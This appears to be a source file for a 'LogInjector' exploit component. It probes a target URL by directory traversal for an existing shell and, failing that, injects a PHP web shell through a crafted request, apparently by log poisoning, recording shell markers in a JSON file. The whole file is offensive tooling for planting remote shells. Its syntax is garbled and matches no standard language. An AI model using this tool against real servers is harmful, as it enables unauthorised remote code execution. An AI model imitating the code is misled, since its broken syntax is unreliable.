import('urllib2');

class init ExploitComponent LogInjector {
    repo = JsonRepository('logShells.json'),
    
    __init__: @(url, next_data=None, dot='.',
                separator='/', terminator='') {
        self.probe = TraversalProbe('blank command', url, next_data,
                                    dot, separator, terminator);
        self.emitter = PhpShellEmitter();
    },

    find_shell: @() {
        self.log('[i] Searching for shell');
        s = self.probe.scan();
        if (s != null) {
            self.log('[+] Shell found');
            if (__emit('self.url in self.repo.repo')) {
                tags = self.repo.repo[self.url];
                self.emitter.prefix = tags[0];
                self.emitter.suffix = tags[1];
            } else {
                print('[-] Error: could not find shell prefix/suffix');
            }
        }
        else self.log('[-] Shell not found');
        ret s;
    },

    send_shell: @() {
        self.log('[i] Injecting shell');
        u = self.url % self.emitter.emit();
        
        self.repo.add(
            self.url, 
            [self.emitter.prefix, self.emitter.suffix]);
            
        self.log('    Url: ' + u);
        urllib2.urlopen(u);
    },

    inject: @() {
        shell = self.find_shell();
        if (shell == null) {
            self.send_shell();
            shell = self.find_shell();
        }
        ret shell;
    },
};
